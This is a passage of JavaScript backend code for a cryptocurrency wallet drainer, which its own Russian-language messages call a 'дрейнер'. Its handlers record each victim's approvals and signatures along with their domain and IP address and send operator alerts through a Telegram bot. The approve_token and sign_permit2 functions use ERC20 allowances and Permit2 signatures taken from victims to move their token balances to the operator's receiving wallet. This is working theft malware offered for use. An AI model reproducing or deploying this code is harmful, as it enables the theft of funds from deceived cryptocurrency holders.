        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос ${data.swapper}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_request = async (response, data) => {
  try {
    add_record({ type: 'approve_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на подтверждение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_request = async (response, data) => {
  try {
    add_record({ type: 'transfer_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_request.chat_id : data.chat_data.transfer_request;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на перевод</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_success = async (response, data) => {
  try {
    add_record({
      type: 'sign_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if (data.asset.type == 'NATIVE') {
      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });
    }
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} подписал запрос</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_swap_success = async (response, data) => {
  try {
    if (data.swapper == 'Permit2') {
      add_record({
        type: 'permit2_success', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, assets: data.list,
        worker_id: data.worker_id || null
      });
    } else {
      add_record({
        type: 'swap_success', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, assets: data.list,
        worker_id: data.worker_id || null, swapper: data.swapper
      });
    }
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
      try {
        let assets_str = '';
        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
        await bot.sendMessage(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} подписал ${data.swapper}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_success = async (response, data) => {
  try {
    add_record({
      type: 'approve_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} выдал подтверждение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_success = async (response, data) => {
  try {
    add_record({
      type: 'transfer_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if (data.asset.type == 'NATIVE') {
      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });
    }
    if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_success.chat_id : data.chat_data.transfer_success;
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} совершил перевод</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'DEBANK' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'matic': return 137;
        case 'avax': return 43114;
        case 'arb': return 42161;
        case 'op': return 10;
        case 'ftm': return 250;
        default: return false;
      }
    } else if (from == 'ZAPPER' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'binance-smart-chain': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        default: return false;
      }
    } else if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const Get_ERC20_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC20'], node);
    const balance = ethers.BigNumber.from(await contract.balanceOf(owner_address));
    const allowance = ethers.BigNumber.from(await contract.allowance(owner_address, spender_address));
    if (balance.lte(ethers.BigNumber.from('0')) || allowance.lte(ethers.BigNumber.from('0'))) return false;
    if (balance.lte(allowance)) return balance.toString();
    else return allowance.toString();
  } catch(err) {
    console.log(err);
    return false;
  }
};

const approve_token = async (response, data) => {
  try {
    if (MS_Settings.Approve.Enable == 0 || MS_Settings.Approve.Withdraw == 0 || data.asset.amount_usd < MS_Settings.Approve.Withdraw_Amount) {
      return send_response(response, { status: 'OK' });
    }
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }
    let current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
    if (!current_allowance) {
      await new Promise(r => setTimeout(r, 2000));
      current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
      if (!current_allowance) {
        await new Promise(r => setTimeout(r, 5000));
        current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
        if (!current_allowance) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      }
    }
    add_allowance(data.address, MS_Wallet_Address, data.asset.address, data.asset.chain_id);
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.asset.chain_id]);
    const signer = new ethers.Wallet(MS_Wallet_Private, node);
    const contract = new ethers.Contract(data.asset.address, MS_Contract_ABI['ERC20'], signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    let gas_limit = null;
    try {
      gas_limit = await contract.estimateGas.transferFrom(data.address, MS_Wallet_Receiver, current_allowance, { from: MS_Wallet_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    } catch(err) {
      if (MS_Settings.Approve.Bypass == 1)
        gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
      else gas_limit = 15000000;
    }
    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
    if (MS_Settings.Approve.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nСистема обнаружила, что, скорее всего, подтверждение является фейковым или вывод этого токена технически невозможен, и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }
      return send_response(response, { status: 'OK' });
    }
    try {
      const tx = await contract.transferFrom(data.address, MS_Wallet_Receiver, current_allowance, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce
      });
      await node.waitForTransaction(tx.hash, 1, 60000);
      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });
      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
        await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно выведен токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    try {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      console.log(err);
    }
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const sign_permit2 = async (response, data) => {
  try {
    if (MS_Settings.Permit2.Mode == 0) return send_response(response, { status: 'OK' });
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.asset.chain_id]);
    const signer = new ethers.Wallet(MS_Wallet_Private, node);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
    try {
      add_record({ type: 'permit2_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, signature: data.signature, message: data.message });
      if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
        await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Подпись:</b> <code>${data.signature}</code>\n<b>Данные:</b> <code>${JSON.stringify(data.message)}</code>\n<b>Владелец:</b> <code>${data.address}</code>\n\nС помощью этих данных вы можете самостоятельно подписать Permit2 в сети ${chain_id_to_name(data.asset.chain_id)} для контракта: <code>0x000000000022d473030f116ddee9f6b43ac78ba3</code>`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      console.log(err);
    }
    if (data.mode == 1) {
      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: MS_Wallet_Address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        if (MS_Settings.Permit2.Bypass == 1)
          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
        else gas_limit = 15000000;
      }
      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Некорректная подпись для Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }
      try {
        const tx = await contract.permit(data.address, data.message, data.signature, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        add_allowance(data.address, MS_Wallet_Address, data.asset.address, data.asset.chain_id, true);
        if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
          try {
            let tokens_list = '';
            try {
              for (const x_token of data.assets)
                tokens_list += `- ${x_token.name}\n`;
            } catch(err) {
              console.log(err);
            }
            await bot.sendMessage(receiver_chat_id, `<b>✅ Успешно подписали Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, на которые выданы разрешения:\n\n${tokens_list}`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        try {
          let transfer_details = [], withdraw_list = '';
          for (const x_token of data.assets) {
            try {
              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
              const balance = await contract_2.balanceOf(data.address);
              if (ethers.BigNumber.from(balance).gt(ethers.BigNumber.from('0'))) {
                transfer_details.push({
                  from: data.address, to: MS_Wallet_Receiver,
                  token: x_token.address, amount: balance
                });
                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
              }
            } catch(err) {
              console.log(err);
            }
          }
          if (transfer_details.length > 0) {
            try {
              gas_limit = await contract.estimateGas.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, { from: MS_Wallet_Address });
              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
            } catch(err) {
              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
            }
            const tx = await contract.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            add_record({
              type: 'asset_sent', domain: data.domain, IP: data.IP,
              user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
            });
            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
              try {
                await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно вывели Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, которые были выведены:\n\n${withdraw_list}`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          }
        } catch(err) {
          console.log(err);
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токены Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    } else {
      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], signer);
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: MS_Wallet_Address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      } catch(err) {
        if (MS_Settings.Permit2.Bypass == 1)
          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
        else gas_limit = 15000000;
      }
      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Некорректная подпись для Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }
      try {
        const tx = await contract.permit(data.address, data.message, data.signature, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        for (const x_token of data.assets) {
          try {
            add_allowance(data.address, MS_Wallet_Address, x_token.address, x_token.chain_id, true);
          } catch(err) {
            console.log(err);
          }
        }
        if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
          try {
            let tokens_list = '';
            try {
              for (const x_token of data.assets)
                tokens_list += `- ${x_token.name}\n`;
            } catch(err) {
              console.log(err);
            }
            await bot.sendMessage(receiver_chat_id, `<b>✅ Успешно подписали Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, на которые выданы разрешения:\n${tokens_list}`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        try {
          let transfer_details = [], withdraw_list = '';
          for (const x_token of data.assets) {
            try {
              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
              const balance = await contract_2.balanceOf(data.address);
              if (ethers.BigNumber.from(balance).gt(ethers.BigNumber.from('0'))) {
                transfer_details.push({
                  from: data.address, to: MS_Wallet_Receiver,
                  token: x_token.address, amount: balance
                });
                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
              }
            } catch(err) {
              console.log(err);
            }
          }
          if (transfer_details.length > 0) {
            try {
              gas_limit = await contract.estimateGas.transferFrom(transfer_details, { from: MS_Wallet_Address });
              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
            } catch(err) {
              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
            }
            const tx = await contract.transferFrom(transfer_details, {
              gasLimit: ethers.BigNumber.from(gas_limit),
              gasPrice: ethers.BigNumber.from(gas_price),
              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
            });
            await node.waitForTransaction(tx.hash, 1, 60000);
            for (const x_asset of data.assets) {
              add_record({
                type: 'asset_sent', domain: data.domain, IP: data.IP,
                user_id: data.user_id, asset: x_asset, worker_id: data.worker_id || null
              });
            }
            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
              try {
                await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно вывели Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, которые были выведены:\n${withdraw_list}`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          }
        } catch(err) {
          console.log(err);
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токены Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
